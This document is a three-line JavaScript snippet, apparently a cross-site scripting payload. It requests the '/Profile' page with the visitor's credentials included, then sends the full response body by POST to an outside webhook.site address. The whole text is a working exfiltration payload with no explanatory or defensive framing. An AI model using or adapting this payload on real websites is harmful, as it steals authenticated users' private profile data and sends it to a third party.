fetch('/Profile',{credentials:'include'})
  .then(r=>r.text())
  .then(d=>fetch('https://webhook.site/dbffcd4a-59b3-4a3b-8de2-453266989ae4',{method:'POST',mode:'no-cors',body:d}))